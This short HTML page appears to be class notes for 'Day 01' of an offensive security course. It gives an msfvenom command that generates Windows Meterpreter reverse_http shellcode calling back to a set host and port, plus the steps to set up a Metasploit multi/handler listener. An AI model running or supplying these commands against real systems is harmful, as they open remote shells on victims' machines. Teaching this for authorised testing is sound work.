<div align="center">
  <h1>Day 01</h1>
  <br/>
</div>

<h4><a href="https://docs.google.com/presentation/d/1FN5lp1BmMC50iKv0Atp-tVLaKw6Q2IjRZ8m1_yLrcZ8/edit?usp=sharing">Slides</a></h4>
<br>

<h2>Metasploit commands:</h2>
<h3>Shellcode generation:</h3>
<ul>
<li>msfvenom -p windows/x64/meterpreter/reverse_http LHOST=10.10.61.38 LPORT=9999 -f go</li>
</ul>

<h3>Listener:</h3>
<ol>
<li>msfconsole</li>
<li>exploit/multi/handler</li>
<li>set payload windows/x64/meterpreter/reverse_http</li>
<li>set LHOST <<IP address>IP Address></li>
<li>set LPORT <<Port>Port></li>
<li>run</li>
</ol>
